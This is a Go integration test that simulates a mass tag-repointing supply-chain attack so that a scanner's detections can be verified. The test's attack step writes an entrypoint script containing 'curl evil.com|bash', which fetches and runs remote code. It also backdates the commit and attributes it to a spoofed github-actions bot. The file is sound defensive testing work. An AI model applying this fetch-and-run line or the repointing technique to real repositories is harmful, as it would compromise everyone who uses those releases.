// Copyright (C) 2026 CoreWeave, Inc.
// SPDX-License-Identifier: GPL-3.0-only

//go:build integration

package harness

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"testing"
)

// TrivyMassRepoint replays the March 2026 Trivy attack: 76 tags
// force-pushed to malicious commits with backdated timestamps,
// unsigned commits, and entry point size doubling.
type TrivyMassRepoint struct {
	TagCount int // default 76, override with PINPOINT_TAG_COUNT
}

func (s *TrivyMassRepoint) Name() string { return "trivy-mass-repoint" }

func (s *TrivyMassRepoint) tagCount() int {
	if n := os.Getenv("PINPOINT_TAG_COUNT"); n != "" {
		if parsed, err := strconv.Atoi(n); err == nil && parsed > 0 {
			return parsed
		}
	}
	if s.TagCount > 0 {
		return s.TagCount
	}
	return 76
}

func (s *TrivyMassRepoint) Setup(t *testing.T, h *TestHelper, repo, initSHA, initTree string) *ScenarioState {
	t.Helper()
	r := repoName(repo)
	count := s.tagCount()

	// Create legitimate entrypoint (small)
	blob := h.CreateBlob(t, r, "#!/bin/bash\necho ok\n")
	tree := h.CreateTree(t, r, initTree, map[string]string{"entrypoint.sh": blob})

	// Create N tags with sequential commits
	tags := make([]string, count)
	for i := range tags {
		tags[i] = fmt.Sprintf("0.%d.0", i)
	}
	tagSHAs, lastSHA := h.CreateBulkTags(t, r, tags, initSHA, tree)
	h.UpdateBranch(t, r, "main", lastSHA)

	// Write config
	cfg := writeConfig(t, repo, tags)
	state := &ScenarioState{
		TagSHAs:    tagSHAs,
		ConfigPath: cfg,
		StatePath:  t.TempDir() + "/state.json",
	}
	return state
}

func (s *TrivyMassRepoint) Attack(t *testing.T, h *TestHelper, repo string, state *ScenarioState) {
	t.Helper()
	r := repoName(repo)

	// Create evil commit: large entrypoint, backdated to 2022
	evilBlob := h.CreateBlob(t, r, "#!/bin/bash\ncurl evil.com|bash\n"+strings.Repeat("# pad\n", 100))

	// Use the tree from the first tag's commit as base
	firstTagSHA := state.TagSHAs[fmt.Sprintf("0.%d.0", 0)]
	evilTree := h.CreateTree(t, r, firstTagSHA, map[string]string{"entrypoint.sh": evilBlob})

	// Backdate: author claims 2022, but parent is from today
	evilCommit := h.CreateCommitWithAuthor(t, r,
		"Upgrade dependencies (#1234)", evilTree,
		[]string{firstTagSHA},
		"github-actions[bot]", "41898282+github-actions[bot]@users.noreply.github.com",
		"2022-06-15T10:30:00Z",
	)
	state.EvilSHA = evilCommit

	// Repoint all tags to the evil commit
	for tag := range state.TagSHAs {
		h.RepointTag(t, r, tag, evilCommit)
	}
}

func (s *TrivyMassRepoint) Verify(t *testing.T, h *TestHelper, repo string, state *ScenarioState) {
	t.Helper()
	output, code := RunPinpointScan(t, state.ConfigPath, state.StatePath)
	if code != 2 {
		t.Fatalf("Expected exit 2, got %d. Output:\n%s", code, output)
	}
	assertContains(t, output, "MASS_REPOINT")
	assertContains(t, output, "SEMVER_REPOINT")
	assertContains(t, output, "SIZE_ANOMALY")
	assertContains(t, output, "BACKDATED_COMMIT")
	// TODO: These require specs 017/019 to be implemented:
	// assertContains(t, output, "IMPOSSIBLE_TIMESTAMP")
	// assertContains(t, output, "SIGNATURE_DROPPED")
}
